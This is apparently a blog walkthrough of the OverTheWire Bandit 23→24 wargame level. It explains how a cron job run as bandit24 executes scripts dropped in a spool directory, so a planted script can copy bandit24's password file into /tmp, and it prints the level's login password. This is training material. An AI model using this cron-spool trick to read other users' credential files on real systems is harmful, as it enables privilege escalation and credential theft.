+++
title = "Bandit 23 → 24"
date = 2026-06-19
description = "walkthrough of the Bandit 23 → 24"
tags = ["bandit", "walkthrough", "linux", "otw"]
+++
[previous level](../../posts/Bandit/bandit_22_23)

### Login
ssh: `ssh -p 2220 bandit23@bandit.labs.overthewire.org`
pass: `0Zf11ioIjMVN551jX3CmStKLYqjk54Ga`
***

### Level Goal

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
***

### Solution
Let's start by checking the cronjob configuration:
```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24 
@reboot bandit24 /usr/bin/cronjob_bandit24.sh  &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh  &> /dev/null
```
Let's check the script:
```bash
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
```
Let's try to understand what the script does:
+ `whoami` → resolves to bandit24
+ `cd /var/spool/"$myname"/foo` → changes directory to `/var/spool/bandit24/foo`
+ `for i in * .*;` → iterates over all files in the current directory
+ `if [ "$i" != "." ] && [ "$i" != ".." ];` → checks if the current file is not `.` or `..`
+ `owner="$(stat --format "%U" "./$i")"` → gets the owner of the current file
+ `[ "${owner}" = "bandit23" ]` → checks if the owner is bandit23
+ `[ -f "$i" ]` → checks if the current file is a regular file
+ `timeout -s 9 60 "./$i"` → executes the current file and kills it after 60 seconds
+ `rm -rf "./$i"` → removes the current file

>Any regular file inside /var/spool/bandit24/foo that is owned by bandit23 will be executed as user bandit24 once within a minute, and then deleted.

We cannot read /etc/bandit_pass/bandit24 directly as bandit23, but bandit24 can.
The cron job will happily execute a script we place in /var/spool/bandit24/foo as long as it is owned by bandit23 and is a regular file.

So the plan:

1. Create a private working directory under /tmp.
2. Inside it, create:
    + A script that reads /etc/bandit_pass/bandit24 and writes it to a file in our /tmp dir.
    + A destination file (or just rely on shell redirection to create it).
3. Make the script executable and ensure the directory is writable by bandit24 (so it can create/overwrite the output file).
4. Copy the script to `/var/spool/bandit24/foo/`.
5. Wait for cron to run it, then read the password from our /tmp file.

#### Create a temp dir
```bash
bandit23@bandit:~$ mktemp -d
/tmp/tmp.YgfQrYCjYF

bandit23@bandit:~$ cd /tmp/tmp.YgfQrYCjYF
bandit23@bandit:/tmp/tmp.YgfQrYCjYF$ touch password
```
We will have the script drop the password into /tmp/tmp.YgfQrYCjYF/password.
Make the directory and file broadly accessible so bandit24 can write to it:

```bash
bandit23@bandit:/tmp/tmp.YgfQrYCjYF$ chmod +rx .
bandit23@bandit:/tmp/tmp.YgfQrYCjYF$ chmod +rwx password
```

Create a simple script:

```bash
bandit23@bandit:/tmp/tmp.YgfQrYCjYF$ cat > bandit_pass.sh << 'EOF'
#!/bin/bash
echo "Copying passwordfile /etc/bandit_pass/bandit24 to /tmp/tmp.YgfQrYCjYF/password"
cat /etc/bandit_pass/bandit24 > /tmp/tmp.YgfQrYCjYF/password
EOF
```
Make the script executable and copy it to `/var/spool/bandit24/foo`:
```bash
bandit23@bandit:/tmp/tmp.YgfQrYCjYF$ chmod +rx bandit_pass.sh
bandit23@bandit:/tmp/tmp.YgfQrYCjYF$ cp bandit_pass.sh /var/spool/bandit24/foo/bandit_pass.sh
```
Wait for cron to run it, then read the password from our /tmp file:
```bash
bandit23@bandit:/tmp/tmp.YgfQrYCjYF$ cat /tmp/tmp.YgfQrYCjYF/password
```
With that we have the password of the next level!
***
[next level](../../posts/Bandit/bandit_24_25)
